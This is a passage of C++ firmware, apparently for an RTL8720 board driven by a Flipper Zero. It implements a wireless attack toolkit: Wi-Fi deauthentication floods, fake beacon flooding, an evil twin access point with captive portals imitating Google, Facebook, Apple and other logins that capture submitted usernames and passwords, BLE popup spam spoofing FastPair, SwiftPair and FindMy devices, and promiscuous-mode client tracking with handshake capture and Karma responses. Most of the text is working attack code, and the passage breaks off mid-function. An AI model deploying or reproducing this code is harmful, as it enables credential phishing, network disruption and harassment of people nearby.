    DEBUG_SER_PRINTLN("Main loop TX enabled");
}

void stopAllDeauth() {
    doDeauthTx = false;  // Stop main loop TX
    deauthTargetIdx = -1;

    // Turn off red LED, back to green (ready)
    stopLedEffect();
    digitalWrite(LED_R, LOW);
    digitalWrite(LED_G, HIGH);
    digitalWrite(LED_B, LOW);

    for (int i = 0; i < deauthTaskCount; i++) {
        if (deauthTasks[i].handle) {
            vTaskDelete(deauthTasks[i].handle);
            deauthTasks[i].handle = NULL;
        }
        if (deauthTasks[i].network_index) {
            delete deauthTasks[i].network_index;
            deauthTasks[i].network_index = NULL;
        }
        if (deauthTasks[i].target_client) {
            delete[] deauthTasks[i].target_client;
            deauthTasks[i].target_client = NULL;
        }
    }
    deauthTaskCount = 0;
}

// Simplified deauth matching original KinimodD approach
void deauthTask(void* params) {
    DeauthTask* task = (DeauthTask*)params;
    int index = *task->network_index;
    int reason = task->reason;

    WiFiNetwork& net = networks[index];
    uint8_t deauth_bssid[6];
    memcpy(deauth_bssid, net.bssid, 6);

    Serial.print("Deauth: ");
    Serial.print(net.ssid);
    Serial.print(" Ch:");
    Serial.println(net.channel);
    Serial.flush();

    // No WiFi reinit - original doesn't need it
    // Just set channel and start TX
    Serial.println("Starting TX...");
    Serial.flush();

    Serial.print("Target BSSID: ");
    Serial.println(net.bssid_str);
    Serial.print("Channel: ");
    Serial.println(net.channel);
    Serial.flush();

    // Just signal that deauth is ready - actual TX will happen in main loop
    Serial.println("Deauth task ready - TX in main loop");
    Serial.flush();

    // Keep task alive but don't TX here
    while (true) {
        vTaskDelay(1000 / portTICK_PERIOD_MS);
    }
}

void doDeauthInMainLoop() {
    if (!doDeauthTx || deauthTargetIdx < 0 || deauthTargetIdx >= (int)networks.size()) return;

    WiFiNetwork& net = networks[deauthTargetIdx];
    uint8_t broadcast[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};

    wext_set_channel(WLAN0_NAME, net.channel);

    Serial.print("TX>");
    wifi_tx_deauth_frame(net.bssid, broadcast, 2);
    Serial.print("<");
}

// ============== Beacon Flooding ==============

void startBeaconFlood(int mode) {
    stopBeaconFlood();

    int* modeParam = new int(mode);
    xTaskCreate(beaconFloodTaskFunc, "beacon", 2048, (void*)modeParam, 1, &beaconFloodTask);

    if (mode == 1) randomBeaconActive = true;
    if (mode == 2) rickrollBeaconActive = true;
}

void stopBeaconFlood() {
    if (beaconFloodTask) {
        vTaskDelete(beaconFloodTask);
        beaconFloodTask = NULL;
    }
    if (customBeaconTask) {
        vTaskDelete(customBeaconTask);
        customBeaconTask = NULL;
    }
    randomBeaconActive = false;
    rickrollBeaconActive = false;
    customBeaconActive = false;
    digitalWrite(LED_G, LOW);
}

void startCustomBeacon(String ssid) {
    stopBeaconFlood();

    if (ssid.length() > 0 && ssid.length() <= 32) {
        String* ssidPtr = new String(ssid);
        xTaskCreate(customBeaconTaskFunc, "cbeacon", 2048, (void*)ssidPtr, 1, &customBeaconTask);
        customBeaconActive = true;
        customBeaconSSID = ssid;
    }
}

void beaconFloodTaskFunc(void* params) {
    int mode = *((int*)params);
    delete (int*)params;

    uint8_t fakeMac[6];
    uint8_t broadcast[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
    int rickrollIndex = 0;

    // Pre-generate rickroll MACs
    uint8_t rickrollMacs[8][6];
    for (int i = 0; i < 8; i++) {
        uint32_t hash = stringHash(String(rickroll_ssids[i]));
        for (int j = 0; j < 6; j++) {
            rickrollMacs[i][j] = (hash + j) & 0xFF;
            hash = hash >> 8;
        }
        rickrollMacs[i][0] &= 0xFE;
        rickrollMacs[i][0] |= 0x02;
    }

    while (true) {
        String ssid;
        int channel;

        if (mode == 1) {
            // Random beacon
            for (int i = 0; i < 6; i++) {
                fakeMac[i] = random(0x00, 0xFF);
            }
            fakeMac[0] &= 0xFE;
            fakeMac[0] |= 0x02;

            ssid = generateRandomString(random(8, 32));

            if (random(0, 2) == 0) {
                channel = channels_2g[random(0, 11)];
            } else {
                channel = channels_5g[random(0, 8)];
            }
        } else if (mode == 2) {
            // Rickroll
            memcpy(fakeMac, rickrollMacs[rickrollIndex], 6);
            ssid = rickroll_ssids[rickrollIndex];
            rickrollIndex = (rickrollIndex + 1) % 8;
            channel = channels_2g[random(0, 11)];
        }

        wext_set_channel(WLAN0_NAME, channel);
        wifi_tx_beacon_frame(fakeMac, broadcast, ssid.c_str());

        digitalWrite(LED_G, !digitalRead(LED_G));
        vTaskDelay(10 / portTICK_PERIOD_MS);
    }
}

void customBeaconTaskFunc(void* params) {
    String* ssidPtr = (String*)params;
    String ssid = *ssidPtr;
    delete ssidPtr;

    uint8_t fakeMac[6];
    uint8_t broadcast[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};

    while (true) {
        for (int i = 0; i < 6; i++) {
            fakeMac[i] = random(0x00, 0xFF);
        }
        fakeMac[0] &= 0xFE;
        fakeMac[0] |= 0x02;

        int channel;
        if (random(0, 2) == 0) {
            channel = channels_2g[random(0, 11)];
        } else {
            channel = channels_5g[random(0, 8)];
        }

        wext_set_channel(WLAN0_NAME, channel);
        wifi_tx_encrypted_beacon_frame(fakeMac, broadcast, ssid.c_str(), channel);

        digitalWrite(LED_B, !digitalRead(LED_B));
        vTaskDelay(10 / portTICK_PERIOD_MS);
    }
}

// ============== Evil Twin AP ==============

// Static buffer for channel string (avoid dangling pointer from String.c_str())
static char ap_channel_str[8] = "6";

void startEvilTwin(PortalType portal) {
    if (evilTwinActive || clientHandlerTask != NULL) {
        stopEvilTwin();
    }

    DEBUG_SER_PRINTLN("Starting Evil Twin AP...");

    currentPortal = portal;

    // CRITICAL: Stop promiscuous mode first - it conflicts with AP mode
    if (promiscActive) {
        DEBUG_SER_PRINTLN("Stopping promisc for AP mode...");
        stopPromisc();
        vTaskDelay(500 / portTICK_PERIOD_MS);
    }

    // Stop any active deauth
    if (doDeauthTx) {
        stopAllDeauth();
        vTaskDelay(200 / portTICK_PERIOD_MS);
    }

    // Turn off WiFi completely before switching to AP mode
    DEBUG_SER_PRINTLN("Turning off WiFi...");
    wifi_off();
    vTaskDelay(1000 / portTICK_PERIOD_MS);

    // Prepare channel string
    snprintf(ap_channel_str, sizeof(ap_channel_str), "%d", current_channel);

    DEBUG_SER_PRINT("Starting AP: ");
    DEBUG_SER_PRINT(ap_ssid);
    DEBUG_SER_PRINT(" pass: ");
    DEBUG_SER_PRINT(ap_pass);
    DEBUG_SER_PRINT(" ch: ");
    DEBUG_SER_PRINTLN(ap_channel_str);

    // WiFi.apbegin() handles driver init internally
    // Try OPEN network first (more compatible), then secured if password set
    int ret;
    if (strlen(ap_pass) < 8) {
        // Open AP (no password or too short for WPA)
        DEBUG_SER_PRINTLN("Starting OPEN AP...");
        ret = WiFi.apbegin(ap_ssid, ap_channel_str);
    } else {
        // Secured AP with password
        DEBUG_SER_PRINTLN("Starting secured AP...");
        ret = WiFi.apbegin(ap_ssid, ap_pass, ap_channel_str);
    }

    DEBUG_SER_PRINT("apbegin returned: ");
    DEBUG_SER_PRINTLN(ret);

    // Give AP time to start broadcasting
    vTaskDelay(2000 / portTICK_PERIOD_MS);

    if (ret != WL_CONNECTED) {
        DEBUG_SER_PRINTLN("AP start FAILED!");
        sendResponse('e', "AP_FAILED");
        return;
    }

    // Start DNS server after AP is up
    start_DNS_Server();

    // Set flag BEFORE starting task
    evilTwinActive = true;

    // Start HTTP handler task
    xTaskCreate(clientHandlerTaskFunc, "http", 4096, NULL, 1, &clientHandlerTask);

    digitalWrite(LED_R, HIGH);  // Red on for evil twin
    digitalWrite(LED_G, LOW);
    digitalWrite(LED_B, LOW);
    DEBUG_SER_PRINTLN("Evil twin AP active!");
}

void stopEvilTwin() {
    DEBUG_SER_PRINTLN("Stopping Evil Twin...");

    // Signal task to stop gracefully
    evilTwinActive = false;

    // Give task time to exit its loop and clean up
    vTaskDelay(500 / portTICK_PERIOD_MS);

    // Stop the server first (before deleting task)
    server.stop();
    vTaskDelay(100 / portTICK_PERIOD_MS);

    // Now delete task if it's still around
    if (clientHandlerTask) {
        vTaskDelete(clientHandlerTask);
        clientHandlerTask = NULL;
    }

    // Unbind DNS
    unbind_dns();
    vTaskDelay(100 / portTICK_PERIOD_MS);

    // Turn off WiFi completely
    wifi_off();
    vTaskDelay(500 / portTICK_PERIOD_MS);

    // Reinitialize WiFi in STA mode for normal operation
    WiFiDrv::wifiDriverInit();
    wifi_on(RTW_MODE_STA);  // STA mode, not AP mode!
    vTaskDelay(500 / portTICK_PERIOD_MS);
    WiFi.status();  // Trigger proper initialization

    // Back to green (ready state)
    digitalWrite(LED_R, LOW);
    digitalWrite(LED_G, HIGH);
    digitalWrite(LED_B, LOW);
    DEBUG_SER_PRINTLN("Evil twin stopped, WiFi back to STA mode");
}

void clientHandlerTaskFunc(void* params) {
    (void)params;
    server.begin();

    while (evilTwinActive) {
        WiFiClient client = server.available();

        if (client.connected()) {
            digitalWrite(LED_G, HIGH);  // Green flash on client connect

            String request = "";
            unsigned long timeout = millis();

            while (client.connected() && evilTwinActive && millis() - timeout < 2000) {
                while (client.available()) {
                    char c = client.read();
                    request += c;
                    timeout = millis();
                }
                vTaskDelay(10 / portTICK_PERIOD_MS);
            }

            if (request.length() > 0 && evilTwinActive) {
                handleHTTPRequest(client, request);
            }

            client.stop();
            digitalWrite(LED_G, LOW);
        }

        vTaskDelay(10 / portTICK_PERIOD_MS);
    }

    // Clean exit
    DEBUG_SER_PRINTLN("HTTP handler task exiting...");
    clientHandlerTask = NULL;
    vTaskDelete(NULL);
}

void handleHTTPRequest(WiFiClient& client, String& request) {
    // Parse path
    int pathStart = request.indexOf(' ') + 1;
    int pathEnd = request.indexOf(' ', pathStart);
    String path = request.substring(pathStart, pathEnd);

    DEBUG_SER_PRINT("Request: ");
    DEBUG_SER_PRINTLN(path);

    String response = "HTTP/1.1 200 OK\r\nContent-Type: text/html\r\nConnection: close\r\n\r\n";

    // Handle captive portal detection
    if (path == "/" ||
        path.startsWith("/generate_204") ||
        path.startsWith("/hotspot-detect") ||
        path.startsWith("/connecttest") ||
        path.startsWith("/gen_204") ||
        path.startsWith("/ncsi")) {

        // Serve portal based on type
        switch (currentPortal) {
            case PORTAL_GOOGLE:
                response += PORTAL_GOOGLE_HTML;
                break;
            case PORTAL_FACEBOOK:
                response += PORTAL_FACEBOOK_HTML;
                break;
            case PORTAL_AMAZON:
                response += PORTAL_AMAZON_HTML;
                break;
            case PORTAL_APPLE:
                response += PORTAL_APPLE_HTML;
                break;
            case PORTAL_NETFLIX:
                response += PORTAL_NETFLIX_HTML;
                break;
            case PORTAL_MICROSOFT:
                response += PORTAL_MICROSOFT_HTML;
                break;
            default:
                response += PORTAL_DEFAULT_HTML;
                break;
        }
    } else if (path.startsWith("/login")) {
        // Parse credentials
        int qmark = path.indexOf('?');
        if (qmark != -1) {
            String query = path.substring(qmark + 1);

            String username = "";
            String password = "";

            int userIdx = query.indexOf("username=");
            int passIdx = query.indexOf("password=");
            int emailIdx = query.indexOf("email=");

            if (userIdx != -1) {
                int endIdx = query.indexOf('&', userIdx);
                if (endIdx == -1) endIdx = query.length();
                username = query.substring(userIdx + 9, endIdx);
            }
            if (emailIdx != -1 && username == "") {
                int endIdx = query.indexOf('&', emailIdx);
                if (endIdx == -1) endIdx = query.length();
                username = query.substring(emailIdx + 6, endIdx);
            }
            if (passIdx != -1) {
                int endIdx = query.indexOf('&', passIdx);
                if (endIdx == -1) endIdx = query.length();
                password = query.substring(passIdx + 9, endIdx);
            }

            // URL decode
            username.replace("%40", "@");
            username.replace("+", " ");
            password.replace("%40", "@");
            password.replace("+", " ");

            DEBUG_SER_PRINT("CREDS: ");
            DEBUG_SER_PRINT(username);
            DEBUG_SER_PRINT(" / ");
            DEBUG_SER_PRINTLN(password);

            // Send to Flipper
            String credData = username + String((char)SEP) + password;
            sendResponse('C', credData);
        }

        response += "<html><body><h1>Login Successful</h1><p>Please wait...</p></body></html>";
    } else {
        response = "HTTP/1.1 404 Not Found\r\nContent-Type: text/plain\r\nConnection: close\r\n\r\nNot Found";
    }

    client.print(response);
}

// ============== BLE Functions ==============

#ifndef NO_BLE_TEST
// BLE scan callback with tracking
void bleScanCallback(T_LE_CB_DATA* p_data) {
    BLEAdvertData foundDevice;
    foundDevice.parseScanInfo(p_data);

    String addrStr = foundDevice.getAddr().str();
    int rssi = foundDevice.getRSSI();
    unsigned long now = millis();

    // Check if already in list - update tracking data
    for (size_t i = 0; i < ble_devices.size(); i++) {
        if (ble_devices[i].address == addrStr) {
            // Update existing device
            BLEDevice_t& dev = ble_devices[i];
            dev.rssi = rssi;
            dev.last_seen = now;
            dev.seen_count++;
            dev.is_tracking = true;
            if (rssi < dev.rssi_min) dev.rssi_min = rssi;
            if (rssi > dev.rssi_max) dev.rssi_max = rssi;
            // Update name if we get a better one
            if (foundDevice.hasName() && dev.name == "Unknown") {
                dev.name = foundDevice.getName();
            }
            return;
        }
    }

    // New device - add to list
    BLEDevice_t dev;
    dev.address = addrStr;
    dev.rssi = rssi;
    dev.rssi_min = rssi;
    dev.rssi_max = rssi;
    dev.name = foundDevice.hasName() ? foundDevice.getName() : "Unknown";
    dev.first_seen = now;
    dev.last_seen = now;
    dev.seen_count = 1;
    dev.is_tracking = true;

    if (ble_devices.size() < 100) {  // Increased limit for tracking
        ble_devices.push_back(dev);
    }
}

void startBLEScan() {
    DEBUG_SER_PRINTLN("Starting BLE scan...");
    ble_devices.clear();
    bleScanActive = true;

    startLedEffect(2);  // BLE rainbow (purple spectrum)

    // Initialize BLE if not already
    BLE.init();
    BLE.setDeviceName(String("gattrose"));
    BLE.setScanCallback(bleScanCallback);
    BLE.beginCentral(0);

    BLEScan* scanner = BLE.configScan();
    scanner->setScanMode(GAP_SCAN_MODE_ACTIVE);
    scanner->setScanInterval(100);
    scanner->setScanWindow(50);
    scanner->updateScanParams();
    scanner->startScan(5000);  // 5 second scan

    // Wait for scan to complete
    vTaskDelay(5500 / portTICK_PERIOD_MS);

    stopLedEffect();
    bleScanActive = false;
    BLE.end();

    sendResponse('l', "SCAN_DONE:" + String(ble_devices.size()));
}

void stopBLEScan() {
    if (bleScanActive) {
        BLEScan* scanner = BLE.configScan();
        scanner->stopScan();
        bleScanActive = false;
        BLE.end();
    }
}

void startBLESpam() {
    if (bleSpamTask) {
        stopBLESpam();
    }

    xTaskCreate(bleSpamTaskFunc, "blespam", 2048, NULL, 1, &bleSpamTask);
    bleSpamActive = true;
}

void stopBLESpam() {
    if (bleSpamTask) {
        vTaskDelete(bleSpamTask);
        bleSpamTask = NULL;
    }
    if (bleSpamActive) {
        BLEAdvert* advert = BLE.configAdvert();
        advert->stopAdv();
        BLE.end();
    }
    bleSpamActive = false;
}

// FastPair model IDs (Google/Android)
const uint32_t fastPairModels[] = {
    0x0001F0,  // Bose QuietComfort 35 II
    0x000047,  // Sony WH-1000XM3
    0x470000,  // Samsung Galaxy Buds
    0x2D7A23,  // Google Pixel Buds
    0xF52494,  // JBL Tune 225
    0x718FA4,  // AirPods Pro (Google sees)
    0x0E30C3,  // Beats Studio3
    0x003000,  // Sony WF-1000XM3
    0x00B727,  // Harman Kardon
    0xD446A7   // Random device
};

// SwiftPair device names (Windows)
const char* swiftPairNames[] = {
    "Surface Headphones",
    "Xbox Controller",
    "Surface Earbuds",
    "Microsoft Mouse",
    "Arc Mouse",
    "Surface Keyboard",
    "Xbox Elite",
    "JBL Speaker"
};

void bleSpamTaskFunc(void* params) {
    (void)params;

    BLE.init();
    BLE.setDeviceName(String("gattrose"));
    BLE.beginPeripheral();
    BLEAdvert* advert = BLE.configAdvert();

    int spamIndex = 0;
    int typeRotation = 0;

    DEBUG_SER_PRINT("BLE spam started, type: ");
    DEBUG_SER_PRINTLN(bleSpamType);

    while (bleSpamActive) {
        uint8_t currentType = bleSpamType;
        if (bleSpamType == 4) {  // "all" mode - rotate through types
            currentType = typeRotation % 4;
            typeRotation++;
        }

        switch (currentType) {
            case 0: {
                // Random name spam
                BLEAdvertData advData;
                advData.addFlags(GAP_ADTYPE_FLAGS_LIMITED | GAP_ADTYPE_FLAGS_BREDR_NOT_SUPPORTED);
                advData.addCompleteName(generateRandomString(8).c_str());
                advert->setAdvData(advData);
                break;
            }
            case 1: {
                // FastPair (Android popup spam)
                // Format: Service Data (0x16) with Google FastPair UUID (0xFE2C) + Model ID
                uint32_t modelId = fastPairModels[spamIndex % (sizeof(fastPairModels)/sizeof(fastPairModels[0]))];

                BLEAdvertData advData;
                advData.addFlags(0x06);
                // Build raw service data: length, type, UUID, model ID
                uint8_t rawData[] = {
                    0x06,  // Length of following data
                    0x16,  // Service Data type
                    0x2C, 0xFE,  // FastPair UUID
                    (uint8_t)((modelId >> 16) & 0xFF),
                    (uint8_t)((modelId >> 8) & 0xFF),
                    (uint8_t)(modelId & 0xFF)
                };
                advData.addData(rawData, sizeof(rawData));
                advert->setAdvData(advData);
                break;
            }
            case 2: {
                // SwiftPair (Windows popup spam)
                // Microsoft vendor specific with SwiftPair capability
                const char* devName = swiftPairNames[spamIndex % (sizeof(swiftPairNames)/sizeof(swiftPairNames[0]))];
                BLEAdvertData advData;
                advData.addFlags(GAP_ADTYPE_FLAGS_GENERAL | GAP_ADTYPE_FLAGS_BREDR_NOT_SUPPORTED);
                // Build raw mfg data: length, type, Microsoft ID + SwiftPair indicator
                uint8_t mfgRaw[] = {0x05, 0xFF, 0x06, 0x00, 0x03, 0x00};
                advData.addData(mfgRaw, sizeof(mfgRaw));
                advData.addCompleteName(devName);
                advert->setAdvData(advData);
                break;
            }
            case 3: {
                // AirTag/FindMy spam
                // Apple's FindMy uses manufacturer specific with Apple ID (0x004C)
                BLEAdvertData advData;
                advData.addFlags(GAP_ADTYPE_FLAGS_LIMITED | GAP_ADTYPE_FLAGS_BREDR_NOT_SUPPORTED);
                // Build raw Apple mfg data
                uint8_t appleRaw[25];
                appleRaw[0] = 24;    // Length
                appleRaw[1] = 0xFF;  // Mfg Specific type
                appleRaw[2] = 0x4C;  // Apple low byte
                appleRaw[3] = 0x00;  // Apple high byte
                appleRaw[4] = 0x12;  // FindMy type
                appleRaw[5] = 0x19;  // Data length
                // Random public key portion (makes each beacon look unique)
                for (int i = 6; i < 25; i++) {
                    appleRaw[i] = random(256);
                }
                advData.addData(appleRaw, sizeof(appleRaw));
                advert->setAdvData(advData);
                break;
            }
        }

        advert->setMinInterval(20);  // Fast advertising for maximum spam
        advert->setMaxInterval(40);
        advert->updateAdvertParams();
        advert->startAdv();

        vTaskDelay(80 / portTICK_PERIOD_MS);  // Quick rotation

        advert->stopAdv();

        spamIndex++;
        digitalWrite(LED_B, !digitalRead(LED_B));  // Visual feedback
    }

    DEBUG_SER_PRINTLN("BLE spam stopped");
    vTaskDelete(NULL);
}
#else
// Stub functions when BLE is disabled
void startBLEScan() {
    sendResponse('e', "BLE_DISABLED");
}
void stopBLEScan() {}
void startBLESpam() {
    sendResponse('e', "BLE_DISABLED");
}
void stopBLESpam() {}
#endif

// ============== Client Detection (Promiscuous Mode) ==============

// Get unique channels from scanned networks
void getNetworkChannels(std::vector<int>& channelList) {
    channelList.clear();
    for (size_t i = 0; i < networks.size(); i++) {
        int ch = networks[i].channel;
        bool found = false;
        for (size_t j = 0; j < channelList.size(); j++) {
            if (channelList[j] == ch) {
                found = true;
                break;
            }
        }
        if (!found) {
            channelList.push_back(ch);
        }
    }
}

// Channel hopping task for client detection
void channelHopTaskFunc(void* params) {
    (void)params;
    std::vector<int> channelList;
    int channelIndex = 0;
    int cycleCount = 0;

    DEBUG_SER_PRINTLN("Channel hop task started");

    while (promiscActive) {
        // Get current network channels
        getNetworkChannels(channelList);

        if (channelList.size() > 0) {
            // Hop to next channel
            channelIndex = (channelIndex + 1) % channelList.size();
            int newChannel = channelList[channelIndex];

            if (newChannel != currentPromiscChannel) {
                wext_set_channel(WLAN0_NAME, newChannel);
                currentPromiscChannel = newChannel;
            }

            // Debug: print stats every full cycle through channels
            if (channelIndex == 0) {
                cycleCount++;
                DEBUG_SER_PRINT("Cycle ");
                DEBUG_SER_PRINT(cycleCount);
                DEBUG_SER_PRINT(": frames=");
                DEBUG_SER_PRINT(frameCount);
                DEBUG_SER_PRINT(" data=");
                DEBUG_SER_PRINT(dataFrameCount);
                DEBUG_SER_PRINT(" probe=");
                DEBUG_SER_PRINT(probeCount);
                DEBUG_SER_PRINT(" assoc=");
                DEBUG_SER_PRINT(assocCount);
                DEBUG_SER_PRINT(" auth=");
                DEBUG_SER_PRINT(authCount);
                DEBUG_SER_PRINT(" clients=");
                DEBUG_SER_PRINTLN(clients.size());
            }
        } else {
            // No networks scanned yet, cycle through common channels
            static int defaultChannels[] = {1, 6, 11, 36, 149};
            static int defaultIdx = 0;
            defaultIdx = (defaultIdx + 1) % 5;
            wext_set_channel(WLAN0_NAME, defaultChannels[defaultIdx]);
            currentPromiscChannel = defaultChannels[defaultIdx];
        }

        // Dwell time per channel (1500ms for better client capture)
        vTaskDelay(1500 / portTICK_PERIOD_MS);
    }

    DEBUG_SER_PRINTLN("Channel hop task ended");
    channelHopTask = NULL;
    vTaskDelete(NULL);
}

void startPromisc() {
    if (promiscActive) return;

    wifi_enter_promisc_mode();
    wifi_set_promisc(RTW_PROMISC_ENABLE_2, promiscCallback, 1);
    promiscActive = true;
    frameCount = 0;

    // Start channel hopping task
    if (channelHopTask == NULL) {
        xTaskCreate(channelHopTaskFunc, "ChannelHop", 4096, NULL, 2, &channelHopTask);
    }

    DEBUG_SER_PRINTLN("Promiscuous mode enabled with channel hopping");
}

void stopPromisc() {
    if (!promiscActive) return;

    wifi_set_promisc(RTW_PROMISC_DISABLE, NULL, 0);
    promiscActive = false;

    // Channel hop task will exit on its own when promiscActive = false
    // Give it time to clean up
    vTaskDelay(300 / portTICK_PERIOD_MS);
    if (channelHopTask != NULL) {
        vTaskDelete(channelHopTask);
        channelHopTask = NULL;
    }

    DEBUG_SER_PRINTLN("Promiscuous mode disabled");
}

void promiscCallback(unsigned char* buf, unsigned int len, void* userdata) {
    if (len < 24) return;

    frameCount++;  // Track total frames

    // Visual debug - quick blue flash every 100 frames
    if (frameCount % 100 == 0) {
        digitalWrite(LED_B, HIGH);
        delayMicroseconds(500);
        digitalWrite(LED_B, LOW);
    }

    int rssi = -50;  // Default RSSI if not available
    uint8_t* bssid = NULL;

    // RTL8720: userdata may contain ieee80211_frame_info_t with RSSI
    if (userdata) {
        typedef struct {
            unsigned short i_fc;
            unsigned short i_dur;
            unsigned char i_addr1[6];
            unsigned char i_addr2[6];
            unsigned char i_addr3[6];
            unsigned short i_seq;
            unsigned char bssid[6];
            unsigned char encrypt;
            signed char rssi;
        } frame_info_t;

        frame_info_t* info = (frame_info_t*)userdata;
        rssi = info->rssi;
        bssid = info->bssid;
    }

    uint8_t frameType = buf[0] & 0x0C;  // Bits 2-3 = type
    uint8_t frameSubtype = (buf[0] >> 4) & 0x0F;  // Bits 4-7 = subtype

    // Data frames (type=2, so frameType & 0x0C == 0x08)
    if (frameType == 0x08) {
        processDataFrame(buf, len, rssi, bssid);

        // Process EAPOL frames for PMKID and handshake capture
        if (pmkidCaptureActive || handshakeCaptureActive) {
            processEAPOL(buf, len, rssi);
        }
    }
    // Management frames (type=0, so frameType & 0x0C == 0x00)
    else if (frameType == 0x00) {
        switch (frameSubtype) {
            case 0x00:  // Association Request - client joining AP
            case 0x02:  // Reassociation Request - client roaming
            case 0x04:  // Probe Request - client scanning
            case 0x0B:  // Authentication - client authenticating
                processManagementFrame(buf, len, rssi, frameSubtype);
                break;
        }
    }
}

// Process management frames (probe req, assoc req, reassoc req, auth)
void processManagementFrame(uint8_t* frame, int len, int rssi, uint8_t subtype) {
    if (len < 24) return;

    // For management frames: addr1=DA, addr2=SA(client), addr3=BSSID
    uint8_t* clientMac = frame + 10;  // Source address (client)
    uint8_t* bssid = frame + 16;      // BSSID (AP)

    // Skip broadcast/multicast source
    if (clientMac[0] & 0x01) return;

    // Track frame types
    if (subtype == 0x04) probeCount++;
    else if (subtype == 0x00 || subtype == 0x02) assocCount++;
    else if (subtype == 0x0B) authCount++;

    // Check if we already know this client
    String macStr = macToString(clientMac);
    for (size_t i = 0; i < clients.size(); i++) {
        if (clients[i].mac_str == macStr) {
            clients[i].rssi = rssi;
            clients[i].last_seen = millis();
            return;
        }
    }

    // Find AP by BSSID (for assoc/reassoc/auth frames)
    int apIndex = -1;
    if (subtype != 0x04) {  // Not a probe request (probes go to broadcast BSSID)
        for (size_t i = 0; i < networks.size(); i++) {
            if (memcmp(networks[i].bssid, bssid, 6) == 0) {
                apIndex = i;
                break;
            }
        }
    } else {
        // For probe requests, try to extract SSID
        if (len > 26) {
            uint8_t ieType = frame[24];
            uint8_t ieLen = frame[25];
            if (ieType == 0 && ieLen > 0 && ieLen <= 32 && (26 + ieLen) <= len) {
                char probedSSID[33] = {0};
                memcpy(probedSSID, frame + 26, ieLen);
                probedSSID[ieLen] = '\0';

                // Log probe if probe logging is active
                if (probeLogActive) {
                    addProbeLogEntry(probedSSID, clientMac, rssi);
                }

                // Karma attack: respond to probe with matching beacon
                if (karmaActive && strlen(probedSSID) > 0) {
                    sendKarmaBeacon(probedSSID, currentPromiscChannel);
                }

                for (size_t i = 0; i < networks.size(); i++) {
                    if (networks[i].ssid == probedSSID) {
                        apIndex = i;
                        break;
                    }
                }
            }
        }
    }

    // Add new client
    if (clients.size() < MAX_CLIENTS) {
        WiFiClient_t cli;
        memcpy(cli.mac, clientMac, 6);
        cli.mac_str = macStr;
        cli.rssi = rssi;
        cli.ap_index = apIndex;
        cli.last_seen = millis();

        clients.push_back(cli);

        // If associated with an AP, add to that network's client list
        if (apIndex >= 0) {
            WiFiNetwork& net = networks[apIndex];
            if (net.client_count < MAX_CLIENTS_PER_AP) {
                memcpy(net.clients[net.client_count], clientMac, 6);
                net.client_rssi[net.client_count] = rssi;
                net.client_count++;
            }

            // Notify Flipper
            String data = String(apIndex) + String((char)SEP) + macStr + String((char)SEP) + String(rssi);
            sendResponse('c', data);

            const char* frameNames[] = {"Assoc", "?", "Reassoc", "?", "Probe", "?", "?", "?", "?", "?", "?", "Auth"};
            DEBUG_SER_PRINT(frameNames[subtype]);
            DEBUG_SER_PRINT(" client: ");
            DEBUG_SER_PRINT(macStr);
            DEBUG_SER_PRINT(" -> AP ");
            DEBUG_SER_PRINTLN(apIndex);
        } else {
            DEBUG_SER_PRINT("Probe client: ");
            DEBUG_SER_PRINTLN(macStr);
        }
    }
}

// Process probe requests to find clients searching for networks (legacy - now handled by processManagementFrame)
void processProbeRequest(uint8_t* frame, int len, int rssi) {
    if (len < 24) return;

    probeCount++;

    // Source MAC is at offset 10 (addr2)
    uint8_t* clientMac = frame + 10;

    // Skip broadcast/multicast
    if (clientMac[0] & 0x01) return;

    // Check if we already know this client
    String macStr = macToString(clientMac);
    for (size_t i = 0; i < clients.size(); i++) {
        if (clients[i].mac_str == macStr) {
            clients[i].rssi = rssi;
            clients[i].last_seen = millis();
            return;
        }
    }

    // Try to extract SSID from probe request (if directed probe)
    // SSID IE starts at offset 24 (after 802.11 header)
    int apIndex = -1;
    if (len > 26) {
        uint8_t ieType = frame[24];
        uint8_t ieLen = frame[25];
        if (ieType == 0 && ieLen > 0 && ieLen <= 32 && (26 + ieLen) <= len) {
            // Extract SSID
            char probedSSID[33] = {0};
            memcpy(probedSSID, frame + 26, ieLen);
            probedSSID[ieLen] = '\0';

            // Find matching network by SSID
            for (size_t i = 0; i < networks.size(); i++) {
                if (networks[i].ssid == probedSSID) {
                    apIndex = i;
                    break;
                }
            }
        }
    }

    // Add client even without AP association (apIndex = -1 means unassociated)
    if (clients.size() < MAX_CLIENTS) {
        WiFiClient_t cli;
        memcpy(cli.mac, clientMac, 6);
        cli.mac_str = macStr;
        cli.rssi = rssi;
        cli.ap_index = apIndex;
        cli.last_seen = millis();

        clients.push_back(cli);

        // If associated with an AP, add to that network's client list
        if (apIndex >= 0) {
            WiFiNetwork& net = networks[apIndex];
            if (net.client_count < MAX_CLIENTS_PER_AP) {
                memcpy(net.clients[net.client_count], clientMac, 6);
                net.client_rssi[net.client_count] = rssi;
                net.client_count++;
            }

            // Notify Flipper
            String data = String(apIndex) + String((char)SEP) + macStr + String((char)SEP) + String(rssi);
            sendResponse('c', data);
        }

        DEBUG_SER_PRINT("Probe client: ");
        DEBUG_SER_PRINTLN(macStr);
    }
}

void processDataFrame(uint8_t* frame, int len, int rssi, uint8_t* bssidFromInfo) {
    if (len < 24) return;

    dataFrameCount++;

    uint8_t* addr1 = frame + 4;
    uint8_t* addr2 = frame + 10;
    uint8_t* addr3 = frame + 16;

    uint8_t toDS = (frame[1] & 0x01);
    uint8_t fromDS = (frame[1] & 0x02) >> 1;

    uint8_t* clientMac;
    uint8_t* bssid;

    if (toDS && !fromDS) {
        // Client -> AP: addr1=BSSID, addr2=client, addr3=DA
        clientMac = addr2;
        bssid = addr1;
    } else if (!toDS && fromDS) {
        // AP -> Client: addr1=client, addr2=BSSID, addr3=SA
        clientMac = addr1;
        bssid = addr2;
    } else {
        return;
    }

    // Use BSSID from frame if not provided via userdata
    if (!bssidFromInfo) {
        bssidFromInfo = bssid;
    }

    // Skip broadcast/multicast
    if (clientMac[0] & 0x01) return;

    // Find AP by BSSID
    int apIndex = -1;
    for (size_t i = 0; i < networks.size(); i++) {
        if (memcmp(networks[i].bssid, bssidFromInfo, 6) == 0) {
            apIndex = i;
            break;
        }
    }

    // Debug: periodic status print
    if (millis() - lastDebugPrint > 5000) {
        lastDebugPrint = millis();
        DEBUG_SER_PRINT("Data frames: ");
        DEBUG_SER_PRINT(dataFrameCount);
        DEBUG_SER_PRINT(", unmatched: ");
